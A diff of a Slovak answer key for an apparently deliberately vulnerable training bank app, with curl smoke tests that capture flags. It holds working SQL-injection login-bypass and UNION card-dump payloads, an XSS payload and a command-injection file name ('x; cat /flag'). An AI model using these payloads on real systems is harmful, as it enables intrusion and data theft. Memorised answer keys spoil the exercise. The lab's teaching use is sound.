@@ -52,7 +52,8 @@ priamo appka:
 > ten istý cookie jar (`-b ck.txt`) vo všetkých volaniach — viď smoke-test nižšie.
 
 ### Ako sa dostať „dnu" (do banky)
-Bežný hráč nemá platné bankové heslo — vstup do banky je cez **W1-01 (SQLi login bypass)** nižšie.
+Dve možnosti: **zaregistrovať sa** (`/register` — email + 2× heslo, účet sa uloží,
+mail sa neoveruje), alebo cez **W1-01 (SQLi login bypass)** nižšie.
 Po prihlásení sa sprístupnia bankové funkcie (Prehľad, Transakcie, Prevod, Export,
 prípadne Asistent).
 
@@ -91,10 +92,11 @@ prípadne Asistent).
   vlastný bucket, takže viacero hráčov naraz sa neprebíja.
 
 ### W1-04 — reflected XSS (A05)
-- **Kde:** verejné `Vyhľadávanie` → `/search`
-- **`q`:** `<img src=x onerror="fetch('/search/solved')">` (spustí sa v prehliadači)
+- **Kde:** `Vyhľadávanie` → `/search` (**až po prihlásení do banky**)
+- **`q`:** `<img src=x onerror="fetch('/search/solved?n='+window.__proof)">`
+  Payload číta nonce zo stránky (`window.__proof`) a pošle ho — **holé
+  `/search/solved` už flag nedá** (403).
 - Po spustení sa na `/search` zobrazí `FLAG_W1-04`.
-- **Overenie bez prehliadača:** `curl -s http://localhost:8080/search/solved`
 
 ### W1-05 — OS command injection (A05)
 - **Kde:** `Export výpisu` → `/export`, pole *Názov súboru*
@@ -183,7 +185,7 @@ curl -s -c ck.txt -o /dev/null -X POST -d "username=tester" -d "password=test123
 curl -s -b ck.txt -c ck.txt --data-urlencode "username=' OR '1'='1'-- " --data-urlencode "password=x" http://localhost:8080/login >/dev/null
 curl -s -b ck.txt http://localhost:8080/dashboard | grep -o 'RPC{[^}]*}'                        # W1-01
 curl -s -b ck.txt -G http://localhost:8080/transactions --data-urlencode "q=' UNION SELECT card_number, card_holder, status FROM cards-- " | grep -o 'RPC{[^}]*}' | tail -1   # W1-02
-curl -s -b ck.txt http://localhost:8080/search/solved                                           # W1-04
+NONCE=$(curl -s -b ck.txt -c ck.txt "http://localhost:8080/search?q=x" | grep -o 'window.__proof="[0-9a-f]*"' | sed 's/.*"\([0-9a-f]*\)".*/\1/'); curl -s -b ck.txt "http://localhost:8080/search/solved?n=$NONCE"   # W1-04
 curl -s -b ck.txt -G http://localhost:8080/export --data-urlencode "name=x; cat /flag" | grep -o 'RPC{[^}]*}'   # W1-05
 
 # W2 (WEEK>=2) — token cez branu
